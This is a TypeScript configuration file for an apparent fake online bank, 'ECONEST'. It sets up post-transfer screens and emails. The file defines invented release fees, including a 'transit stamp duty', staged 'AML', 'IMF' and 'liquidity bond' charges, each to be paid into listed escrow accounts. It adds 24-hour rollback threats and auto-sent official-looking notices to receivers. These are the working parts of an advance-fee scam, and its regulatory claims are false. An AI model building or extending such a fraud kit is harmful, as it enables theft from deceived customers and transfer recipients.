import { FeeReason, TransferScreenConfig } from '../types';

export const DEFAULT_FEE_REASONS: FeeReason[] = [
  {
    id: 'fee-instant-clearing',
    name: 'Instant Clearing Surcharge',
    description: 'Real-time gross settlement routing through the central clearing tunnel',
    amount: 15.00,
    isEnabled: true
  },
  {
    id: 'fee-regulatory-levy',
    name: 'Regulatory Compliance Levy',
    description: 'Mandatory banking compliance and automated AML audit verification',
    amount: 5.00,
    isEnabled: true
  },
  {
    id: 'fee-cross-border',
    name: 'Cross-Border Network Fee',
    description: 'Correspondent foreign exchange clearing surcharge for international wires',
    amount: 25.00,
    isEnabled: true
  },
  {
    id: 'fee-fraud-guarantee',
    name: 'Fraud Protection Guarantee',
    description: 'Transit insurance and 100% funds recovery guarantee protection',
    amount: 8.50,
    isEnabled: false
  },
  {
    id: 'fee-express-priority',
    name: 'Express Priority Clearance',
    description: 'Fast-track queue jumping for high-value business transfers',
    amount: 35.00,
    isEnabled: false
  }
];

export const DEFAULT_TRANSFER_SCREEN_CONFIG: TransferScreenConfig = {
  successTitle: 'Transfer Authenticated & Dispatched',
  successSubtitle: 'Your electronic debit advice has been certified and submitted to the ECONEST Real-Time Gross Settlement network.',
  noticeBannerText: 'Transaction Notice: A confirmation email has been dispatched to your inbox and the bank administration portal. Beneficiary accounts typically reflect funds immediately.',
  noticeBannerType: 'success',
  showReferenceId: true,
  showFeeBreakdown: true,
  showPrintButton: true,
  showShareButton: true,
  pendingReviewNotice: 'Compliance Notice: Outgoing wires over limit may require administrative clearance. Track status anytime in your History.',
  
  // Admin Custom Fee Payment Message Immediately After Transfer
  feePaymentMessageEnabled: true,
  feePaymentMode: 'single', // 'single' | 'multiple' (default to single fee only)
  singleFeeAtATime: true, // Only a single fee can appear at a time on customer screen
  showReceiverEmailInTransfer: false, // Turned OFF by default: receiver email not needed, will not appear during transfer
  singleFeeMessage: {
    title: 'Mandatory Interbank Transit Stamp Duty & Release Clearance',
    amount: 350.00,
    description: 'Federal and international banking compliance regulations require a one-time settlement fee to be processed to complete the final credit release into the recipient account.',
    instructions: 'Remit the specified clearance surcharge to the dedicated central escrow clearing ledger below. Once confirmed, the funds will be unlocked instantly.',
    accountNumber: 'ESC-8849-0192-EC',
    bankName: 'ECONEST Escrow Clearance Bank',
    routingCode: 'ECNTUS33CLR',
    urgencyText: 'Action Required: Remittance must be verified within 24 hours to prevent transfer rollback.'
  },
  multipleFeeStages: [
    {
      id: 'stage-1-aml',
      stageNumber: 1,
      title: 'Anti-Money Laundering (AML) Legal Clearance Surcharge',
      amount: 150.00,
      description: 'Mandatory regulatory audit and international AML clearance protocol for outbound electronic settlement.',
      instructions: 'Step 1 of settlement: Submit payment of $150.00 to the central clearing tunnel to clear automated audit hold.',
      statusText: 'Required - Step 1',
      requiredAccount: 'ESC-AML-9901-EC',
      requiredBank: 'ECONEST Central Reserve Clearing'
    },
    {
      id: 'stage-2-imf',
      stageNumber: 2,
      title: 'IMF Cross-Border Monetary Transit Stamp Duty',
      amount: 250.00,
      description: 'International Monetary Fund sovereign transit duty required for cross-jurisdiction wire transmission.',
      instructions: 'Step 2 of settlement: Following Stage 1 approval, deposit the $250.00 stamp duty to endorse transmission certificates.',
      statusText: 'Pending Step 1 Completion',
      requiredAccount: 'ESC-IMF-4420-EC',
      requiredBank: 'ECONEST Foreign Exchange Bureau'
    },
    {
      id: 'stage-3-bond',
      stageNumber: 3,
      title: 'Central Bank Liquidity Guarantee Release Bond',
      amount: 450.00,
      description: 'Underwriter liquidity insurance bond protecting capital against double-spending and ledger reversibility.',
      instructions: 'Step 3 of settlement: Final refundable release bond. Upon ledger certification, 100% of the funds are unlocked for beneficiary withdrawal.',
      statusText: 'Final Settlement Step',
      requiredAccount: 'ESC-BND-7715-EC',
      requiredBank: 'ECONEST Federal Settlement Vault'
    }
  ],

  // Receiver Email Custom Messaging Configuration
  receiverCustomEmailConfig: {
    autoSendEnabled: true,
    subject: '[ECONEST BANK] Inward Transfer Notice for {receiver_name} - Ref #{reference_id}',
    headline: 'Official Inward Capital Credit Advice',
    customMessage: 'Dear {receiver_name},\n\nAn electronic transfer of {amount} {currency} has been initiated to your account at {bank_name} by {sender_name}.\n\nTransfer Reference ID: #{reference_id}\nRegistered Receiver Email: {receiver_email}\nDate & Time: {date}\n\nOur administration desk has recorded your email address for real-time correspondence and settlement updates.\n\n{fee_breakdown}\n\nIf you have any questions or require custom documentation, please reply directly to this notification or contact ECONEST Client Relations.',
    actionText: 'View Settlement Status',
    actionUrl: '/login'
  }
};

